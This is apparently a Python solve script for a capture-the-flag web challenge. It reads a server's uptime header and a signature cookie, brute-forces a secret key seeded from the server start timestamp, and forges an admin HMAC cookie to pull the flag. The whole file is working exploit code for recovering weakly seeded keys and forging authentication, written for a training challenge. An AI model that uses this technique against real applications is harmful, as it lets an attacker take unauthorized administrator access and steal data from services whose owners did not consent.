#! python3.8
import hashlib
import hmac
import random
import string
import urllib.request
from datetime import datetime, timezone


def get_random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def sign(text, key):
    return hmac.new(bytes(key, 'ascii'), bytes(text, 'ascii'), hashlib.sha256).hexdigest()

url_index = "http://trulyrandomsignature.challs.olicyber.it/"
url_admin = "http://trulyrandomsignature.challs.olicyber.it/admin"

print("[*] Fetching live token and uptime from server...")
req = urllib.request.Request(url_index)

try:
    with urllib.request.urlopen(req) as response:
        # Extract headers and cookies
        uptime_header = response.headers.get('X-Uptime')
        cookies = response.headers.get_all('Set-Cookie')
        
        if not uptime_header:
            print("[-] Error: X-Uptime header not found.")
            exit(1)
            
        server_uptime = int(uptime_header)
        
        # Extract the signature cookie for 'not_admin'
        target_signature = None
        for cookie in cookies:
            if 'signature=' in cookie:
                target_signature = cookie.split('signature=')[1].split(';')[0]
                break
                
        if not target_signature:
            print("[-] Error: Signature cookie not found.")
            exit(1)
            
        print(f"[+] Got X-Uptime: {server_uptime}")
        print(f"[+] Got target signature: {target_signature}")

except Exception as e:
    print(f"[-] Failed to connect to server: {e}")
    exit(1)

# Calculate exact server start time using time.time() synchronization via the header
# On the server: resp.headers['X-Uptime'] = str(int(time.time()-uptime))
# So: server_start_time = current_server_time - server_uptime
# Since we approximate current_server_time with time.time():
import time

estimated_start_time = time.time() - server_uptime

# Search a tiny window around the estimated start time to account for network latency
print("[*] Brute-forcing seed around calculated start time...")
found_key = None

for offset in range(-60, 60): 
    test_time = estimated_start_time + offset
    seed = datetime.fromtimestamp(test_time, tz=timezone.utc).strftime('%Y-%m-%d %H:%M:%S')
    
    random.seed(seed)
    test_key = get_random_string(32)
    
    # Check if this key generates the 'not_admin' signature we just received
    if sign("not_admin", test_key) == target_signature:
        found_key = test_key
        print(f"[+] Success! Found SUPER_SECRET_KEY: {found_key} (Seed: {seed})")
        break

if not found_key:
    print("[-] Could not find the correct key. Try running the script again.")
    exit(1)

# Generate the admin signature and request the flag
admin_signature = sign("admin", found_key)
print(f"[+] Generated admin signature: {admin_signature}")

req_admin = urllib.request.Request(
    url_admin, 
    headers={"Cookie": f"user=admin; signature={admin_signature}"}
)

try:
    with urllib.request.urlopen(req_admin) as response:
        flag_body = response.read().decode('utf-8')
        print(f"\n[!] FLAG FOUND:\n{flag_body}")
except Exception as e:
    print(f"[-] Failed to fetch admin page: {e}")
